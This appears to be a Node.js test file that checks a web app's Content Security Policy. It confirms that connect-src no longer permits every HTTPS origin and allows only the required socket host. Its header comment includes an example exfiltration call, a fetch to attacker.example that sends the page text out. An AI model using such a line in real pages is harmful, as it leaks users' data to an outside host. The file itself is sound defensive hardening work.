// test/csp-connect-src-rf3998.test.mjs
//
// R-F3998 (C-79) — connect-src allowed exfiltration to any HTTPS host.
//
// THE DEFECT. The policy read `connectSrc: ["'self'", 'wss:', 'https:']`. The
// bare `https:` scheme source matches EVERY https origin on the internet, so any
// XSS, any compromised dependency, or any injected third-party script could
// `fetch('https://attacker.example/?d=' + document.body.innerText)` and the
// browser would allow it. Every other directive in this policy is tight —
// hash-based script-src, `script-src-attr 'none'`, object-src 'none',
// frame-ancestors, base-uri, form-action — so this one line was carrying the
// residual risk for all of them: CSP's value against data theft lives almost
// entirely in connect-src.
//
// WHY IT WAS NOT SIMPLY 'self'. Narrowing on intuition would have broken the
// Network page in production, and silently. `public/js/network.js:407` picks the
// socket origin by hostname: on fly.dev and localhost it connects same-origin,
// but on ANY OTHER host — which is the public `imaria.io` — it connects to
// `https://aria-web.fly.dev`, cross-origin, because the marketing gateway does
// not serve the socket path. So the allowlist has to name that origin, for both
// the https handshake and the wss upgrade.
//
// Everything else was verified unused before removal, which is the part that
// makes this safe rather than lucky:
//   - no absolute-URL fetch anywhere in public/ (every data call is relative)
//   - no Stripe.js (checkout is a redirect, not a cross-origin fetch)
//   - no EventSource
//   - fonts.googleapis.com / fonts.gstatic.com are style-src and font-src, which
//     connect-src does not govern
import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';

const RL = fs.readFileSync(new URL('../middleware/rateLimiter.mjs', import.meta.url), 'utf8');

/** The connectSrc array as written in the policy. */
function connectSrcLine() {
  const m = RL.match(/connectSrc:\s*\[([^\]]*)\]/);
  return m ? m[1] : '';
}

describe('R-F3998 — connect-src names origins, not the whole web', () => {

  it('THE DEFECT: the bare https: scheme source is gone', () => {
    const src = connectSrcLine();
    assert.ok(src, 'connectSrc should be declared');
    assert.doesNotMatch(src, /['"]https:['"]/,
      "a bare 'https:' matches every origin on the internet — it is an "
      + 'exfiltration allowance, not a policy');
    assert.doesNotMatch(src, /['"]wss:['"]/,
      "a bare 'wss:' has the same problem for websockets");
  });

  it('same-origin is still allowed', () => {
    assert.match(connectSrcLine(), /'self'/, "every API call is relative — 'self' is required");
  });

  it('the cross-origin socket host IS allowed, or the Network page breaks on imaria.io', () => {
    // The load-bearing assertion. network.js connects to aria-web.fly.dev from
    // any non-fly host, so omitting this would break real-time chat for every
    // user on the public domain — the exact silent breakage this narrowing risks.
    const src = connectSrcLine();
    assert.match(src, /https:\/\/aria-web\.fly\.dev/,
      'the socket handshake origin must be allowed');
    assert.match(src, /wss:\/\/aria-web\.fly\.dev/,
      'the websocket upgrade to that origin must be allowed');
  });

  it('the allowlist matches what network.js actually connects to', () => {
    // Pins the policy to the code rather than to a copy of it. If someone
    // repoints the socket, this fails instead of the page failing.
    const net = fs.readFileSync(
      path.join(path.dirname(new URL(import.meta.url).pathname.slice(1)), '..', 'public', 'js', 'network.js'),
      'utf8',
    );
    const m = net.match(/['"]https:\/\/([a-z0-9.-]+)['"]/i);
    assert.ok(m, 'network.js should name its fallback socket origin');
    assert.ok(connectSrcLine().includes(m[1]),
      `network.js connects to ${m[1]} but connect-src does not allow it`);
  });

  it('no OTHER external origin sneaks in', () => {
    // Keeps the allowlist from becoming a dumping ground. Anything added here
    // should be a deliberate, reviewed decision.
    const hosts = [...connectSrcLine().matchAll(/['"](?:https|wss):\/\/([a-z0-9.-]+)['"]/gi)]
      .map(m => m[1]);
    for (const h of hosts) {
      assert.equal(h, 'aria-web.fly.dev',
        `unexpected origin '${h}' in connect-src — justify it or remove it`);
    }
  });

  it('the rest of the policy stays tight', () => {
    // Guards against a future "loosen one thing" edit taking the neighbours with
    // it. These are the directives that make the narrowed connect-src worth
    // having.
    assert.match(RL, /scriptSrcAttr:\s*\["'none'"\]/, 'inline event handlers must stay blocked');
    assert.match(RL, /objectSrc:\s*\["'none'"\]/, 'object-src must stay none');
    assert.match(RL, /frameAncestors:\s*\["'self'"\]/, 'clickjacking guard must stay');
    assert.match(RL, /formAction:\s*\["'self'"\]/, 'form exfiltration guard must stay');
    assert.match(RL, /baseUri:\s*\["'self'"\]/, 'base-uri hijack guard must stay');
  });
});
